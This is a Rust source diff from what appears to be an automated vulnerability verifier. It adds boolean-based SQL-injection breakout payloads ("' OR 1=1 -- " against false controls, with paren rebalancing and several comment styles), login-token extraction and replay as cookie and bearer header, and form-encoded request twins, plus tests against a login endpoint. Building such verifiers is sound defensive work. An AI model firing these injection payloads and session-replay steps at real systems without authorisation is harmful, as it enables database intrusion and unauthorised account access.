@@ -1064,6 +1064,61 @@ pub fn sql_delete_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Option<S
     })
 }
 
+/// A boolean-based SQL-injection differential for a value-position injection (`WHERE email =
+/// '${x}'`): three otherwise-identical requests whose tainted value breaks out of the enclosing quote
+/// and appends a boolean before a line comment that neutralizes the statement's remaining text.
+/// `truthy` carries an always-true boolean (`' OR 1=1 -- `), so the statement's `WHERE` is satisfied;
+/// `falsy_a`/`falsy_b` carry always-false booleans (`' OR 1=2 -- `, `' OR 1=3 -- `). The injection is
+/// proved when the truthy response differs from both falsy responses while the two falsy responses
+/// agree: the legs differ only in the truth value of the injected boolean, so a response difference can
+/// come only from the database evaluating injected SQL — a bound parameter would treat all three as the
+/// same literal string and leave every response identical.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct SqlValueCase {
+    pub truthy: Attempt,
+    pub falsy_a: Attempt,
+    pub falsy_b: Attempt,
+}
+
+/// The value-position boolean differentials for a finding the planner mapped to a quoted value
+/// position (see [`Probe::sql_value`]), or an empty vector when it did not. One case per comment style,
+/// so a statement whose remaining text one comment marker fails to neutralize is still reached by
+/// another; the exercise phase tries each until one reproduces. Nothing here is tied to a specific app:
+/// the quote and the field the value enters are mined from the finding and the SQL plan.
+pub fn sql_value_cases(probe: &Probe, canary: &Canary) -> Vec<SqlValueCase> {
+    let Some(value) = probe.sql_value.as_ref() else {
+        return Vec::new();
+    };
+    let q = value.quote;
+    // Close the grouping parens the original predicate left open, so once the trailing comment removes
+    // the statement's original closers the parens still balance and the leg is valid SQL rather than a
+    // uniform syntax error.
+    let closers = ")".repeat(value.open_parens);
+    // A prefix that matches nothing precedes the quote so the predicate the tainted value sits in is
+    // *false* before the injected boolean is OR-ed in: for a plain equality (`email = '<prefix>'`) and
+    // a `LIKE` contains (`name LIKE '%<prefix>'`) alike the original comparison fails, so the response
+    // reflects only the injected boolean — `OR 1=1` matches, `OR 1=2`/`OR 1=3` do not. Without it a
+    // `LIKE '%'` left by an empty breakout matches every row and the legs never differ.
+    let prefix = format!("jssqlv{}", canary.token);
+    // `-- ` is a SQL line comment in SQLite, Postgres and MySQL (with the trailing space); the other
+    // flavors broaden coverage to engines/positions where it does not neutralize the tail.
+    let comments = ["-- ", "-- -", "#", ";-- "];
+    comments
+        .iter()
+        .map(|comment| {
+            let leg = |boolean: &str| {
+                let breakout = format!("{prefix}{q}{closers} OR {boolean}{comment}");
+                place_sql(probe, &breakout, &[], "")
+            };
+            SqlValueCase {
+                truthy: leg("1=1"),
+                falsy_a: leg("1=2"),
+                falsy_b: leg("1=3"),
+            }
+        })
+        .collect()
+}
+
 /// Three otherwise-identical NoSQL requests: one match-all operator and two independent
 /// match-none controls. Only a database interpreting the object as an operator should make the
 /// first response differ while both controls agree.
@@ -1900,6 +1955,121 @@ fn json_object_with_field(field: &str, value: &str, other: &str, other_value: &s
     )
 }
 
+/// A POST request carrying generated credentials as JSON, for a login or registration endpoint the
+/// auth bootstrap exercises. The common credential field names (`email`/`username`, `password`, and
+/// a `passwordRepeat` confirmation some registration forms require) are all sent; an endpoint that
+/// reads only a subset ignores the rest. The signal is irrelevant — the caller reads the response
+/// body for a token rather than matching a marker.
+pub fn credential_post(path: &str, email: &str, password: &str) -> Attempt {
+    let body = format!(
+        "{{\"email\":\"{e}\",\"username\":\"{e}\",\"password\":\"{p}\",\"passwordRepeat\":\"{p}\"}}",
+        e = json_escape(email),
+        p = json_escape(password),
+    );
+    Attempt {
+        verb: "POST",
+        target: path.to_owned(),
+        body: Some(body),
+        headers: vec![("Content-Type".to_owned(), "application/json".to_owned())],
+        signal: Signal::InResponse,
+    }
+}
+
+/// The JWT (or other compact `header.payload.signature` bearer token) a login response returns, so
+/// the bootstrap can carry it back to the gated request. Scans for the first three-part base64url
+/// token: a JWT always begins with a `eyJ` (`{"` base64url) header segment, which anchors the match
+/// and avoids mistaking an unrelated dotted string for a token. `None` when the response carries no
+/// such token (a failed login, or a scheme the verifier cannot drive).
+pub fn extract_bearer_token(body: &str) -> Option<String> {
+    let bytes = body.as_bytes();
+    let is_tok = |b: u8| b.is_ascii_alphanumeric() || b == b'-' || b == b'_';
+    let mut i = 0;
+    while let Some(off) = body[i..].find("eyJ") {
+        let start = i + off;
+        // Not preceded by a token byte, so `eyJ` begins a fresh segment.
+        if bytes
+            .get(start.wrapping_sub(1))
+            .is_none_or(|byte| !is_tok(*byte))
+        {
+            let mut end = start;
+            let mut dots = 0;
+            while let Some(byte) = bytes.get(end)
+                && (is_tok(*byte) || *byte == b'.')
+            {
+                if *byte == b'.' {
+                    dots += 1;
+                }
+                end += 1;
+            }
+            if dots >= 2 {
+                let tok = &body[start..end];
+                // A well-formed compact token has non-empty segments; guard against a trailing dot.
+                if tok.split('.').all(|seg| !seg.is_empty()) {
+                    return Some(tok.to_owned());
+                }
+            }
+        }
+        i = start + 3;
+    }
+    None
+}
+
+/// `attempt` with a session credential attached: the minted token under the cookie the handler reads
+/// (`Cookie: <name>=<token>`) and, for handlers that read the token from the standard bearer header
+/// instead, an `Authorization: Bearer` header. Both are additive and harmless to an endpoint that
+/// ignores one; together they satisfy the in-handler session lookup however it reads the credential.
+pub fn with_session(attempt: &Attempt, cookie: &str, token: &str) -> Attempt {
+    let mut headers = attempt.headers.clone();
+    headers.retain(|(k, _)| {
+        !k.eq_ignore_ascii_case("cookie") && !k.eq_ignore_ascii_case("authorization")
+    });
+    headers.push(("Cookie".to_owned(), format!("{cookie}={token}")));
+    headers.push(("Authorization".to_owned(), format!("Bearer {token}")));
+    Attempt {
+        headers,
+        ..attempt.clone()
+    }
+}
+
+/// A form-urlencoded twin of a JSON-body `attempt`, or `None` when the attempt carries no flat JSON
+/// object body. Some Express apps mount `express.urlencoded` before a route but the JSON body parser
+/// only after it (so the route reads `req.body` from a form submission, never from JSON); sending the
+/// same fields as `application/x-www-form-urlencoded` reaches the handler in that layout. Only flat
+/// string-valued objects convert; a nested or non-object body has no faithful urlencoded form and is
+/// skipped.
+pub fn urlencoded_twin(attempt: &Attempt) -> Option<Attempt> {
+    let body = attempt.body.as_deref()?;
+    let value: serde_json::Value = serde_json::from_str(body).ok()?;
+    let obj = value.as_object()?;
+    let mut pairs = Vec::new();
+    for (k, v) in obj {
+        let s = match v {
+            serde_json::Value::String(s) => s.clone(),
+            serde_json::Value::Number(n) => n.to_string(),
+            serde_json::Value::Bool(b) => b.to_string(),
+            _ => return None,
+        };
+        pairs.push(format!("{}={}", encode(k), encode(&s)));
+    }
+    let mut headers: Vec<(String, String)> = attempt
+        .headers
+        .iter()
+        .filter(|(k, _)| !k.eq_ignore_ascii_case("content-type"))
+        .cloned()
+        .collect();
+    headers.push((
+        "Content-Type".to_owned(),
+        "application/x-www-form-urlencoded".to_owned(),
+    ));
+    Some(Attempt {
+        verb: attempt.verb,
+        target: attempt.target.clone(),
+        body: Some(pairs.join("&")),
+        headers,
+        signal: attempt.signal.clone(),
+    })
+}
+
 /// Packs `value` into the handler's base64-encoded JSON envelope: a JSON object with `value` under
 /// the payload-bearing member and a harmless placeholder under every other member the handler reads
 /// (so an early presence guard passes), base64-encoded in the alphabet the handler decodes.
@@ -1999,6 +2169,56 @@ mod tests {
     use super::super::plan::{AppendedParam, Entry, Method, Probe, SqlColumn, SqlDelete, SqlPlan};
     use super::*;
 
+    #[test]
+    fn auth_bootstrap_extracts_the_session_token_and_replays_it_authenticated() {
+        // A login response returns a compact JWT under a nested `authentication.token` key; the
+        // bootstrap pulls the three-part token out whatever key wraps it, and ignores a short dotted
+        // string that is not a token.
+        let body = r#"{"authentication":{"token":"eyJhbGci.eyJkYXRh.c2ln","bid":6}}"#;
+        assert_eq!(
+            extract_bearer_token(body).as_deref(),
+            Some("eyJhbGci.eyJkYXRh.c2ln")
+        );
+        assert_eq!(
+            extract_bearer_token(r#"{"msg":"Invalid email or password."}"#),
+            None
+        );
+
+        // The minted token rides back to the gated request under the handler's own cookie (and the
+        // bearer header), and a JSON-body attempt gains a form-urlencoded twin for a route whose JSON
+        // parser is mounted after it.
+        let attempt = Attempt {
+            verb: "POST",
+            target: "/profile/image/url".to_owned(),
+            body: Some(r#"{"imageUrl":"http://jss-marker/tok"}"#.to_owned()),
+            headers: vec![("Content-Type".to_owned(), "application/json".to_owned())],
+            signal: Signal::ServiceReached("tok".to_owned()),
+        };
+        let with = with_session(&attempt, "token", "eyJhbGci.eyJkYXRh.c2ln");
+        assert!(
+            with.headers
+                .iter()
+                .any(|(k, v)| k == "Cookie" && v == "token=eyJhbGci.eyJkYXRh.c2ln")
+        );
+        assert!(
+            with.headers
+                .iter()
+                .any(|(k, v)| k == "Authorization" && v == "Bearer eyJhbGci.eyJkYXRh.c2ln")
+        );
+        let form = urlencoded_twin(&with).expect("flat JSON object converts to a form body");
+        assert_eq!(
+            form.body.as_deref(),
+            Some("imageUrl=http%3A%2F%2Fjss-marker%2Ftok")
+        );
+        assert!(
+            form.headers
+                .iter()
+                .any(|(k, v)| k == "Content-Type" && v == "application/x-www-form-urlencoded")
+        );
+        // The form twin keeps the attached session, so it too reaches the authenticated sink.
+        assert!(form.headers.iter().any(|(k, _)| k == "Cookie"));
+    }
+
     fn probe(class: VulnClass, path: &str, entry: Entry) -> Probe {
         Probe {
             method: Method::Get,
@@ -2021,10 +2241,12 @@ mod tests {
             body_object: false,
             body_query_override: None,
             sql: None,
+            sql_value: None,
             array_element: false,
             appended_fields: Vec::new(),
             proto_pollution: None,
             alt_paths: Vec::new(),
+            auth: None,
         }
     }
 
@@ -2875,6 +3097,64 @@ mod tests {
 
         assert!("response jssqliabc123z7".contains(&case.computed));
         assert!(!"control response".contains(&case.computed));
+    }
+
+    #[test]
+    fn sql_value_cases_break_out_of_the_quote_with_a_boolean_differential() {
+        use super::super::plan::SqlValue;
+        let mut p = probe(
+            VulnClass::SqlInjection,
+            "/rest/user/login",
+            Entry::Body(Some("email".to_owned())),
+        );
+        p.method = Method::Post;
+        p.sql_value = Some(SqlValue {
+            quote: '\'',
+            open_parens: 0,
+        });
+        let canary = Canary::new("abc123".to_owned());
+
+        let cases = sql_value_cases(&p, &canary);
+        assert!(!cases.is_empty(), "a value-position plan yields cases");
+        let first = &cases[0];
+        // Each leg closes the quote after a non-matching prefix (so the original equality is false) and
+        // appends a boolean; the legs are identical but for the boolean's truth value, so only SQL
+        // evaluation can separate them. No grouping parens were open, so none are closed.
+        assert_eq!(
+            first.truthy.body.as_deref(),
+            Some("{\"email\":\"jssqlvabc123' OR 1=1-- \"}")
+        );
+        assert_eq!(
+            first.falsy_a.body.as_deref(),
+            Some("{\"email\":\"jssqlvabc123' OR 1=2-- \"}")
+        );
+        assert_eq!(
+            first.falsy_b.body.as_deref(),
+            Some("{\"email\":\"jssqlvabc123' OR 1=3-- \"}")
+        );
+        assert_eq!(first.truthy.verb, "POST");
+        assert_eq!(first.truthy.target, "/rest/user/login");
+
+        // An open grouping paren (a `LIKE` inside `WHERE ((...))`) is re-balanced by the breakout so the
+        // statement stays valid once the comment removes the original closers.
+        p.sql_value = Some(SqlValue {
+            quote: '\'',
+            open_parens: 2,
+        });
+        let paren = &sql_value_cases(&p, &canary)[0];
+        assert_eq!(
+            paren.truthy.body.as_deref(),
+            Some("{\"email\":\"jssqlvabc123')) OR 1=1-- \"}")
+        );
+
+        // A truthy response differing from two agreeing falsy responses reproduces; three identical
+        // responses (a parameterized sink) do not.
+        assert!(sql_blind_reproduced("token", "denied", "denied", &[]));
+        assert!(!sql_blind_reproduced("denied", "denied", "denied", &[]));
+
+        // Without a value-position plan there is nothing to drive.
+        p.sql_value = None;
+        assert!(sql_value_cases(&p, &canary).is_empty());
     }
 
     #[test]
